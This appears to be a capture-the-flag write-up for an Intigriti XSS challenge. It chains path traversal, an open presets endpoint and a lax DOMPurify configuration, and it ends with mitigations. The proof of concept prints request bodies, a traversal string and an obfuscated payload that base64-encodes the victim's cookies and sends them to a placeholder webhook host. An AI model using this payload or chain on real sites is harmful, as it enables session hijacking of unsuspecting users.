# Stored XSS via Path Traversal → DOMPurify Bypass

> ⚠️ This is a private preview. Public disclosure will follow after the challenge ends.

## Overview
Chained exploit using path traversal + unauthorized preset access + DOMPurify misconfiguration leading to stored XSS and session hijacking.

# Stored XSS via Path Traversal → DOMPurify Bypass

> ⚠️ This is a private preview. Public disclosure will follow after the challenge ends.

---

## 🧩 Overview
This write-up demonstrates a Stored Cross-Site Scripting (XSS) vulnerability achieved through a chained exploitation of:
- Path traversal
- Unauthorized access to user presets
- DOMPurify misconfiguration

The issue allows execution of arbitrary JavaScript in a victim’s browser, leading to session hijacking.

---

##  Target
https://challenge-0426.intigriti.io

---

##  Root Cause

The application constructs a manifest URL as:

/note/{noteId}/{panel}/manifest.json

While `noteId` is properly encoded, the `panel` parameter is not:

'/note/' + encodeURIComponent(noteId) + '/' + panel + '/manifest.json'

This allows path traversal using encoded payloads such as:

..%2F..%2Fapi%2Faccount%2Fpreferences%2Freader-presets%2Fevil

---

## 🔗 Exploitation Chain

### 1. Path Traversal
Encoded traversal sequences allow access to unintended internal endpoints.

### 2. Unauthorized Preset Access
Endpoint:
/api/account/preferences/reader-presets/{preset}

- Publicly accessible
- Uses `?note=` to fetch presets linked to a note author

### 3. DOMPurify Misconfiguration
The malicious preset enforces:

renderMode: "full"

This enables:
- `ALLOW_DATA_ATTR = true`

### 4. Script Execution via data-cfg

Payload:

```html
<span data-enhance="custom" data-cfg="new Image().src='https://WEBHOOK?c='+btoa(top['docu'+'ment']['coo'+'kie'])"></span>


Execution flow:

s.textContent = el.dataset.cfg;
document.head.appendChild(s);
```
---

### Proof of Concept

---

Step 1: Store malicious preset

POST /api/account/preferences

{
  "readerPresets": {
    "evil": {
      "profile": {
        "renderMode": "full",
        "widgetSink": "script",
        "widgetTypes": ["custom"]
      }
    }
  }
}

Step 2: Create malicious note

POST /api/notes

{
  "title": "test",
  "content": "<div id=\"enhance-config\" data-types=\"custom\"><span data-enhance=\"custom\" data-cfg=\"new Image().src='https://WEBHOOK?c='+btoa(top['docu'+'ment']['coo'+'kie'])\"></span></div>"
}

Step 3: Send victim link
/note/NOTE_ID/..%2F..%2Fapi%2Faccount%2Fpreferences%2Freader-presets%2Fevil

---
### Impact
---

Stored XSS triggered via crafted URL
Session hijacking
No authentication required for preset access
Minimal user interaction required

---
### Mitigation
---

Encode panel using encodeURIComponent
Restrict preset endpoints to authenticated users only
Harden DOMPurify configuration
Avoid executing scripts from user-controlled attributes

---
### Conclusion
---
This vulnerability highlights how chaining:

Input validation flaws
Access control weaknesses
Client-side misconfigurations

can lead to high-impact exploitation.  
